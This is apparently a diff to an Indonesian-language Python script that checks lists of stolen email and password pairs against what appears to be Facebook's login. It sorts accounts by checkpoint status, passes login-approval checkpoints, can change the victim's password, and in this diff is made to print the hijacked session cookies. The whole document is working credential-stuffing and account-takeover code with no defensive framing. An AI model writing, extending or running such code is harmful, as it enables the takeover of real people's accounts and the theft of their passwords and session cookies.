@@ -46,14 +46,12 @@ class Eksekusi(Main):
 		data.update({"email":self.user,"pass":self.pw})
 		urlPost=session.post(self.url+link.get("action"),data=data)
 		response=par(urlPost.text, "html.parser")
-		if urlPost.status_code!=200:
-			print("[!] Nyalakan lalu matikan mode pesawat 2 Detik")
 		if "c_user" in session.cookies.get_dict():
 			if "Akun Anda Dikunci" in urlPost.text:
 				print(f"\r[×] Akun sesi new\n[=] {self.user} | {self.pw}					\n\n",end="")
 			else:
 				aman+=1
-				print(f"\r[=] {self.user} | {self.pw}\n[√] Akun Aman				\n\n",end="")
+				print(f"\r[=] {self.user} | {self.pw}\n[√] Akun Aman\n[=] Cookie: {''.join(session.cookies.get_dict())}				\n\n",end="")
 		elif "checkpoint" in session.cookies.get_dict():
 			cp+=1
 			title=re.findall("\<title>(.*?)<\/title>",str(response))
@@ -62,17 +60,19 @@ class Eksekusi(Main):
 			for x in response("input"):
 				if x.get("name") in listInput:
 					data2.update({x.get("name"):x.get("value")})
-			response2=par(session.post(self.url+link2.get("action"),data=data2).text,"html.parser")
+			an=session.post(self.url+link2.get("action"),data=data2)
+			response2=par(an.text,"html.parser")
 			number=0
 			print(f"[=] {self.user} | {self.pw}			\n",end="")
 			cek=[cek for cek in response2.find_all("option")]
 			print(f"\r[!] Terdapat {len(cek)} opsi:\n",end="")
 			if(len(cek)==0):
 				if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
+					coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
 					if "y" in ubahP:
 						self.ubah_pw(session,response,link2)
 					else:
-						print(f"\r[√] Akun tap yes									\n")
+						print(f"\r[√] Akun tap yes\n[=] Cookie: {coki}									\n")
 				elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
 					print("\r[×] Akun a2f on							\n")
 				else:
@@ -92,7 +92,7 @@ class Eksekusi(Main):
 				if "c_user" in session.cookies.get_dict():
 					cp-=1
 					aman+=1
-					print(f"\r[=] {self.user} | {self.pw}\n[√] Akun Aman				\n\n",end="")
+					print(f"\r[=] {self.user} | {self.pw}\n[√] Akun Aman\n[=] Cookie: {''.join(session.cookies.get_dict())}				\n",end="")
 					
 		else:
 			salah+=1
@@ -113,8 +113,10 @@ class Eksekusi(Main):
 				if b.get("name") in but2:
 					dat2.update({b.get("name"):b.get("value")})
 			dat2.update({"password_new":"".join(pwBaru)})
-			session.post(self.url+link3.get("action"),data=dat2)
-			print(f"\r[√] Akun tap yes\n[=] Password diubah!\n[=] {self.user} | {''.join(pwBaru)}							\n",end="")
+			an=session.post(self.url+link3.get("action"),data=dat2)
+			coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
+			print(f"\r[√] Akun tap yes\n[=] Password diubah!\n[=] {self.user} | {''.join(pwBaru)}\n[=] Cookie: {coki}							\n",end="")
+			print("")
 
 def menu():
 	print("[1]. Cek opsi satu persatu\n[2]. Cek opsi melalui file\n[!]. Note: di tengah username dan password\n     harus ada tanda '|' atau '•'\n")
